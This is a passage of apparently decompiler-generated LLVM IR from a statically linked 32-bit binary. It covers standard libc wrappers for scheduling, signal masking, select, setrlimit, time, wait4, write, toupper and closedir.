  br i1 %tmp, label %dec_label_pc_805a308, label %dec_label_pc_805a2fc

dec_label_pc_805a2fc:                             ; preds = %entry
  %v1_805a2fc = call i32 @__errno_location(i32 %v0_805a2e8)
  %v0_805a301 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a301 = sub i32 0, %v0_805a301
  %v2_805a303 = inttoptr i32 %v1_805a2fc to i32*
  store i32 %v1_805a301, i32* %v2_805a303, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a308

dec_label_pc_805a308:                             ; preds = %entry, %dec_label_pc_805a2fc
  %v0_805a308 = phi i32 [ %v1_805a2f0, %entry ], [ -1, %dec_label_pc_805a2fc ]
  %v2_805a30c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a30c, i32* @edi, align 4
  ret i32 %v0_805a308

; uselistorder directives
  uselistorder i32 %v1_805a2f0, { 1, 0, 2 }
  uselistorder i32 %v0_805a2e8, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a308, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a310 = load i32, i32* @edi, align 4
  store i32 %v0_805a310, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a318 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a320 = call i32 @sched_get_priority_min(i32 %v0_805a318)
  store i32 %v0_805a318, i32* @ebx, align 4
  store i32 %v1_805a320, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a320, -4095
  br i1 %tmp, label %dec_label_pc_805a338, label %dec_label_pc_805a32c

dec_label_pc_805a32c:                             ; preds = %entry
  %v1_805a32c = call i32 @__errno_location(i32 %v0_805a318)
  %v0_805a331 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a331 = sub i32 0, %v0_805a331
  %v2_805a333 = inttoptr i32 %v1_805a32c to i32*
  store i32 %v1_805a331, i32* %v2_805a333, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a338

dec_label_pc_805a338:                             ; preds = %entry, %dec_label_pc_805a32c
  %v0_805a338 = phi i32 [ %v1_805a320, %entry ], [ -1, %dec_label_pc_805a32c ]
  %v2_805a33c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a33c, i32* @edi, align 4
  ret i32 %v0_805a338

; uselistorder directives
  uselistorder i32 %v1_805a320, { 1, 0, 2 }
  uselistorder i32 %v0_805a318, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_min, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a338, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805a340 = load i32, i32* @ebx, align 4
  store i32 %v0_805a340, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805a353 = call i32 @sched_getparam(i32 %v0_805a340, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805a353, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805a353, -4095
  br i1 %tmp, label %dec_label_pc_805a36c, label %dec_label_pc_805a360

dec_label_pc_805a360:                             ; preds = %entry
  %v0_805a360 = load i32, i32* %stack_var_-4, align 4
  %v1_805a360 = call i32 @__errno_location(i32 %v0_805a360)
  %v0_805a365 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a365 = sub i32 0, %v0_805a365
  %v2_805a367 = inttoptr i32 %v1_805a360 to i32*
  store i32 %v1_805a365, i32* %v2_805a367, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a36c

dec_label_pc_805a36c:                             ; preds = %entry, %dec_label_pc_805a360
  %v0_805a36c = phi i32 [ %v4_805a353, %entry ], [ -1, %dec_label_pc_805a360 ]
  %v2_805a370 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a370, i32* @ebx, align 4
  ret i32 %v0_805a36c

; uselistorder directives
  uselistorder i32 %v4_805a353, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sched_getparam, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a36c, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a374 = load i32, i32* @edi, align 4
  store i32 %v0_805a374, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a37c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805a384 = call i32 @sched_getscheduler(i32 %v0_805a37c)
  store i32 %v0_805a37c, i32* @ebx, align 4
  store i32 %v1_805a384, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a384, -4095
  br i1 %tmp, label %dec_label_pc_805a39c, label %dec_label_pc_805a390

dec_label_pc_805a390:                             ; preds = %entry
  %v1_805a390 = call i32 @__errno_location(i32 %v0_805a37c)
  %v0_805a395 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a395 = sub i32 0, %v0_805a395
  %v2_805a397 = inttoptr i32 %v1_805a390 to i32*
  store i32 %v1_805a395, i32* %v2_805a397, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a39c

dec_label_pc_805a39c:                             ; preds = %entry, %dec_label_pc_805a390
  %v0_805a39c = phi i32 [ %v1_805a384, %entry ], [ -1, %dec_label_pc_805a390 ]
  %v2_805a3a0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a3a0, i32* @edi, align 4
  ret i32 %v0_805a39c

; uselistorder directives
  uselistorder i32 %v1_805a384, { 1, 0, 2 }
  uselistorder i32 %v0_805a37c, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_getscheduler, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a39c, { 1, 0 }
}

define i32 @sched_setscheduler(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a3a4 = load i32, i32* @edi, align 4
  store i32 %v0_805a3a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805a3b4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a3bc = call i32 @sched_setscheduler(i32 %v0_805a3b4, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805a3b4, i32* @ebx, align 4
  store i32 %v3_805a3bc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a3bc, -4095
  br i1 %tmp, label %dec_label_pc_805a3d4, label %dec_label_pc_805a3c8

dec_label_pc_805a3c8:                             ; preds = %entry
  %v1_805a3c8 = call i32 @__errno_location(i32 %v0_805a3b4)
  %v0_805a3cd = load i32, i32* %edi.global-to-local, align 4
  %v1_805a3cd = sub i32 0, %v0_805a3cd
  %v2_805a3cf = inttoptr i32 %v1_805a3c8 to i32*
  store i32 %v1_805a3cd, i32* %v2_805a3cf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a3d4

dec_label_pc_805a3d4:                             ; preds = %entry, %dec_label_pc_805a3c8
  %v0_805a3d4 = phi i32 [ %v3_805a3bc, %entry ], [ -1, %dec_label_pc_805a3c8 ]
  %v2_805a3d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a3d6, i32* @edx, align 4
  %v2_805a3d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a3d8, i32* @edi, align 4
  ret i32 %v0_805a3d4

; uselistorder directives
  uselistorder i32 %v3_805a3bc, { 1, 0, 2 }
  uselistorder i32 %v0_805a3b4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sched_setscheduler, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805a3d4, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a3dc = load i32, i32* @ebx, align 4
  store i32 %v0_805a3dc, i32* %stack_var_-4, align 4
  %v1_805a3e5 = call i32 @sched_yield(i32 %v0_805a3dc)
  store i32 %v1_805a3e5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a3e5, -4095
  br i1 %tmp, label %dec_label_pc_805a3fc, label %dec_label_pc_805a3f0

dec_label_pc_805a3f0:                             ; preds = %entry
  %v0_805a3f0 = load i32, i32* %stack_var_-4, align 4
  %v1_805a3f0 = call i32 @__errno_location(i32 %v0_805a3f0)
  %v0_805a3f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a3f5 = sub i32 0, %v0_805a3f5
  %v2_805a3f7 = inttoptr i32 %v1_805a3f0 to i32*
  store i32 %v1_805a3f5, i32* %v2_805a3f7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a3fc

dec_label_pc_805a3fc:                             ; preds = %entry, %dec_label_pc_805a3f0
  %v0_805a3fc = phi i32 [ %v1_805a3e5, %entry ], [ -1, %dec_label_pc_805a3f0 ]
  %v2_805a400 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a400, i32* @ebx, align 4
  ret i32 %v0_805a3fc

; uselistorder directives
  uselistorder i32 %v1_805a3e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_805a3fc, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805a405 = load i32, i32* @esi, align 4
  store i32 %v0_805a405, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805a41d = load i32, i32* @ebx, align 4
  %v1_805a425 = call i32 @int80_syscall(i32 142)
  store i32 %v0_805a41d, i32* @ebx, align 4
  store i32 %v1_805a425, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805a425, -4095
  br i1 %tmp, label %dec_label_pc_805a43d, label %dec_label_pc_805a431

dec_label_pc_805a431:                             ; preds = %entry
  %v1_805a431 = call i32 @__errno_location(i32 %v0_805a41d)
  %v0_805a436 = load i32, i32* %esi.global-to-local, align 4
  %v1_805a436 = sub i32 0, %v0_805a436
  %v2_805a438 = inttoptr i32 %v1_805a431 to i32*
  store i32 %v1_805a436, i32* %v2_805a438, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a43d

dec_label_pc_805a43d:                             ; preds = %entry, %dec_label_pc_805a431
  %v0_805a43d = phi i32 [ %v1_805a425, %entry ], [ -1, %dec_label_pc_805a431 ]
  %v2_805a43f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a43f, i32* @edx, align 4
  %v2_805a440 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a440, i32* @esi, align 4
  ret i32 %v0_805a43d

; uselistorder directives
  uselistorder i32 %v1_805a425, { 1, 0, 2 }
  uselistorder i32 %v0_805a41d, { 1, 0 }
  uselistorder label %dec_label_pc_805a43d, { 1, 0 }
}

define i32 @__GI_setrlimit(i32 %arg1, %rlimit* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a444 = load i32, i32* @ebx, align 4
  store i32 %v0_805a444, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805a457 = call i32 @setrlimit(i32 %arg1, %rlimit* %arg2)
  store i32 %v4_805a457, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805a457, -4095
  br i1 %tmp, label %dec_label_pc_805a470, label %dec_label_pc_805a464

dec_label_pc_805a464:                             ; preds = %entry
  %v0_805a464 = load i32, i32* %stack_var_-4, align 4
  %v1_805a464 = call i32 @__errno_location(i32 %v0_805a464)
  %v0_805a469 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a469 = sub i32 0, %v0_805a469
  %v2_805a46b = inttoptr i32 %v1_805a464 to i32*
  store i32 %v1_805a469, i32* %v2_805a46b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a470

dec_label_pc_805a470:                             ; preds = %entry, %dec_label_pc_805a464
  %v0_805a470 = phi i32 [ %v4_805a457, %entry ], [ -1, %dec_label_pc_805a464 ]
  %v2_805a474 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a474, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805a470

; uselistorder directives
  uselistorder i32 %v4_805a457, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a470, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_805a479 = load i32, i32* @esi, align 4
  %v4_805a47d = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_805a47d, i32* @ecx, align 4
  %v2_805a489 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_805a489, label %dec_label_pc_805a4a2, label %dec_label_pc_805a48d

dec_label_pc_805a48d:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_805a4a2, label %dec_label_pc_805a492

dec_label_pc_805a492:                             ; preds = %dec_label_pc_805a48d
  %v1_805a492 = call i32 @__errno_location(i32 %v0_805a479)
  %v1_805a497 = inttoptr i32 %v1_805a492 to i32*
  store i32 22, i32* %v1_805a497, align 4
  br label %dec_label_pc_805a4c9

dec_label_pc_805a4a2:                             ; preds = %dec_label_pc_805a48d, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_805a4a7 = load i32, i32* @ebx, align 4
  %v7_805a4af = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_805a4a7, i32* @ebx, align 4
  store i32 %v7_805a4af, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_805a4af, -4095
  br i1 %tmp, label %dec_label_pc_805a4c9, label %dec_label_pc_805a4bb

dec_label_pc_805a4bb:                             ; preds = %dec_label_pc_805a4a2
  %v1_805a4bb = call i32 @__errno_location(i32 %v0_805a4a7)
  %v0_805a4c0 = load i32, i32* %esi.global-to-local, align 4
  %v1_805a4c0 = sub i32 0, %v0_805a4c0
  %v2_805a4c2 = inttoptr i32 %v1_805a4bb to i32*
  store i32 %v1_805a4c0, i32* %v2_805a4c2, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a4c9

dec_label_pc_805a4c9:                             ; preds = %dec_label_pc_805a4bb, %dec_label_pc_805a4a2, %dec_label_pc_805a492
  %storemerge = phi i32 [ -1, %dec_label_pc_805a492 ], [ %v7_805a4af, %dec_label_pc_805a4a2 ], [ -1, %dec_label_pc_805a4bb ]
  %v2_805a4c9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a4c9, i32* @edx, align 4
  store i32 %v0_805a479, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_805a4af, { 1, 0, 2 }
  uselistorder i32 %v0_805a4a7, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a4d0 = load i32, i32* @ebx, align 4
  store i32 %v0_805a4d0, i32* %stack_var_-4, align 4
  %v4_805a4d9 = ptrtoint %_TYPEDEF_sigset_t* %arg1 to i32
  store i32 %v4_805a4d9, i32* %ebx.global-to-local, align 4
  %v3_805a4e4 = call i32 @sigsuspend(%_TYPEDEF_sigset_t* %arg1)
  store i32 %v3_805a4e4, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a4e4, -4095
  br i1 %tmp, label %dec_label_pc_805a4fd, label %dec_label_pc_805a4f1

dec_label_pc_805a4f1:                             ; preds = %entry
  %v0_805a4f1 = load i32, i32* %stack_var_-4, align 4
  %v1_805a4f1 = call i32 @__errno_location(i32 %v0_805a4f1)
  %v0_805a4f6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805a4f6 = sub i32 0, %v0_805a4f6
  %v2_805a4f8 = inttoptr i32 %v1_805a4f1 to i32*
  store i32 %v1_805a4f6, i32* %v2_805a4f8, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805a4fd

dec_label_pc_805a4fd:                             ; preds = %entry, %dec_label_pc_805a4f1
  %v0_805a4fd = phi i32 [ %v3_805a4e4, %entry ], [ -1, %dec_label_pc_805a4f1 ]
  %v2_805a4ff = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a4ff, i32* @edx, align 4
  %v2_805a501 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a501, i32* @ebx, align 4
  ret i32 %v0_805a4fd

; uselistorder directives
  uselistorder i32 %v3_805a4e4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %_TYPEDEF_sigset_t* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805a4fd, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a504 = load i32, i32* @edi, align 4
  store i32 %v0_805a504, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_805a50c = load i32, i32* @ebx, align 4
  %v2_805a514 = call i32 @time(i32* %arg1)
  store i32 %v0_805a50c, i32* @ebx, align 4
  store i32 %v2_805a514, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805a514, -4095
  br i1 %tmp, label %dec_label_pc_805a52c, label %dec_label_pc_805a520

dec_label_pc_805a520:                             ; preds = %entry
  %v1_805a520 = call i32 @__errno_location(i32 %v0_805a50c)
  %v0_805a525 = load i32, i32* %edi.global-to-local, align 4
  %v1_805a525 = sub i32 0, %v0_805a525
  %v2_805a527 = inttoptr i32 %v1_805a520 to i32*
  store i32 %v1_805a525, i32* %v2_805a527, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a52c

dec_label_pc_805a52c:                             ; preds = %entry, %dec_label_pc_805a520
  %v0_805a52c = phi i32 [ %v2_805a514, %entry ], [ -1, %dec_label_pc_805a520 ]
  %v2_805a52e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a52e, i32* @edx, align 4
  %v2_805a530 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a530, i32* @edi, align 4
  ret i32 %v0_805a52c

; uselistorder directives
  uselistorder i32 %v2_805a514, { 1, 0, 2 }
  uselistorder i32 %v0_805a50c, { 1, 0 }
  uselistorder label %dec_label_pc_805a52c, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_805a541 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_805a541
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805a54c = load i32, i32* @edi, align 4
  %v0_805a54d = load i32, i32* @esi, align 4
  store i32 %v0_805a54d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_805a561 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805a569 = call i32 @wait4(i32 %v0_805a561, i32 %v0_805a54d, i32 %v0_805a54c, i32 %tmp5)
  store i32 %v0_805a561, i32* @ebx, align 4
  store i32 %v4_805a569, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805a569, -4095
  br i1 %tmp, label %dec_label_pc_805a581, label %dec_label_pc_805a575

dec_label_pc_805a575:                             ; preds = %entry
  %v1_805a575 = call i32 @__errno_location(i32 %v0_805a561)
  %v0_805a57a = load i32, i32* %esi.global-to-local, align 4
  %v1_805a57a = sub i32 0, %v0_805a57a
  %v2_805a57c = inttoptr i32 %v1_805a575 to i32*
  store i32 %v1_805a57a, i32* %v2_805a57c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805a581

dec_label_pc_805a581:                             ; preds = %entry, %dec_label_pc_805a575
  %v0_805a581 = phi i32 [ %v4_805a569, %entry ], [ -1, %dec_label_pc_805a575 ]
  %v2_805a583 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a583, i32* @edx, align 4
  %v2_805a584 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805a584, i32* @esi, align 4
  store i32 %v0_805a54c, i32* @edi, align 4
  ret i32 %v0_805a581

; uselistorder directives
  uselistorder i32 %v4_805a569, { 1, 0, 2 }
  uselistorder i32 %v0_805a561, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805a581, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805a599 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_805a599
}

define i32 @__libc_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805a5a4 = load i32, i32* @edi, align 4
  store i32 %v0_805a5a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805a5b4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805a5bc = call i32 @write(i32 %v0_805a5b4, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805a5b4, i32* @ebx, align 4
  store i32 %v3_805a5bc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805a5bc, -4095
  br i1 %tmp, label %dec_label_pc_805a5d4, label %dec_label_pc_805a5c8

dec_label_pc_805a5c8:                             ; preds = %entry
  %v1_805a5c8 = call i32 @__errno_location(i32 %v0_805a5b4)
  %v0_805a5cd = load i32, i32* %edi.global-to-local, align 4
  %v1_805a5cd = sub i32 0, %v0_805a5cd
  %v2_805a5cf = inttoptr i32 %v1_805a5c8 to i32*
  store i32 %v1_805a5cd, i32* %v2_805a5cf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805a5d4

dec_label_pc_805a5d4:                             ; preds = %entry, %dec_label_pc_805a5c8
  %v0_805a5d4 = phi i32 [ %v3_805a5bc, %entry ], [ -1, %dec_label_pc_805a5c8 ]
  %v2_805a5d6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805a5d6, i32* @edx, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v2_805a5d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805a5d8, i32* @edi, align 4
  ret i32 %v0_805a5d4

; uselistorder directives
  uselistorder i32 %v3_805a5bc, { 1, 0, 2 }
  uselistorder i32 %v0_805a5b4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805a5d4, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_805a5e0 = add i32 %arg1, 128
  %v6_805a5eb = icmp ugt i32 %v1_805a5e0, 383
  br i1 %v6_805a5eb, label %dec_label_pc_805a5f6, label %dec_label_pc_805a5ed

dec_label_pc_805a5ed:                             ; preds = %entry
  %v0_805a5ed = load i32, i32* inttoptr (i32 134692196 to i32*), align 4
  %v2_805a5f2 = mul i32 %arg1, 2
  %v3_805a5f2 = add i32 %v0_805a5ed, %v2_805a5f2
  %v4_805a5f2 = inttoptr i32 %v3_805a5f2 to i16*
  %v5_805a5f2 = load i16, i16* %v4_805a5f2, align 2
  %v6_805a5f2 = sext i16 %v5_805a5f2 to i32
  br label %dec_label_pc_805a5f6

dec_label_pc_805a5f6:                             ; preds = %entry, %dec_label_pc_805a5ed
  %v0_805a5f6 = phi i32 [ %arg1, %entry ], [ %v6_805a5f2, %dec_label_pc_805a5ed ]
  ret i32 %v0_805a5f6

; uselistorder directives
  uselistorder label %dec_label_pc_805a5f6, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_805a5fc = load i32, i32* @edi, align 4
  %v0_805a5fd = load i32, i32* @esi, align 4
  %v0_805a5fe = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* @edi, align 4
  %v2_805a606 = load i32, i32* %arg1, align 4
  %v12_805a606 = icmp eq i32 %v2_805a606, -1
  %v1_805a609 = icmp eq i1 %v12_805a606, false
  br i1 %v1_805a609, label %dec_label_pc_805a61b, label %dec_label_pc_805a60b

dec_label_pc_805a60b:                             ; preds = %entry
  %v1_805a60b = call i32 @__errno_location(i32 %v0_805a5fe)
  %v1_805a610 = inttoptr i32 %v1_805a60b to i32*
  store i32 9, i32* %v1_805a610, align 4
  br label %dec_label_pc_805a665

dec_label_pc_805a61b:                             ; preds = %entry
  %v12_805a5ff = ptrtoint i32* %stack_var_-28 to i32
  %v1_805a61b = add i32 %tmp3, 24
  store i32 %v1_805a61b, i32* @ebx, align 4
  store i32 134583465, i32* %stack_var_-40, align 4
  store i32 %v12_805a5ff, i32* @esi, align 4
  %v4_805a62a = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134583465, i32 %v1_805a61b)
  %v0_805a62f = load i32, i32* @ebx, align 4
  %v1_805a632 = call i32 @pthread_mutex_lock(i32 %v0_805a62f)
  %v0_805a637 = load i32, i32* @edi, align 4
  %v1_805a637 = inttoptr i32 %v0_805a637 to i32*
  %v2_805a637 = load i32, i32* %v1_805a637, align 4
  store i32 %v2_805a637, i32* @ebx, align 4
  store i32 -1, i32* %v1_805a637, align 4
  %v2_805a640 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_805a640, i32* @ecx, align 4
  store i32 1, i32* %stack_var_-40, align 4
  %v3_805a644 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805a64a = load i32, i32* @edi, align 4
  %v1_805a64a = add i32 %v0_805a64a, 12
  %v2_805a64a = inttoptr i32 %v1_805a64a to i32*
  %v3_805a64a = load i32, i32* %v2_805a64a, align 4
  %v1_805a64d = call i32 @free(i32 %v3_805a64a)
  %v0_805a652 = load i32, i32* @edi, align 4
  %v1_805a655 = call i32 @free(i32 %v0_805a652)
  %v0_805a65a = load i32, i32* @ebx, align 4
  %v1_805a65d = call i32 @__libc_close(i32 %v0_805a65a)
  br label %dec_label_pc_805a665

dec_label_pc_805a665:                             ; preds = %dec_label_pc_805a60b, %dec_label_pc_805a61b
  %v0_805a66b = phi i32 [ -1, %dec_label_pc_805a60b ], [ %v1_805a65d, %dec_label_pc_805a61b ]
  store i32 %v0_805a5fe, i32* @ebx, align 4
  store i32 %v0_805a5fd, i32* @esi, align 4
  store i32 %v0_805a5fc, i32* @edi, align 4
  ret i32 %v0_805a66b

; uselistorder directives
  uselistorder label %dec_label_pc_805a665, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
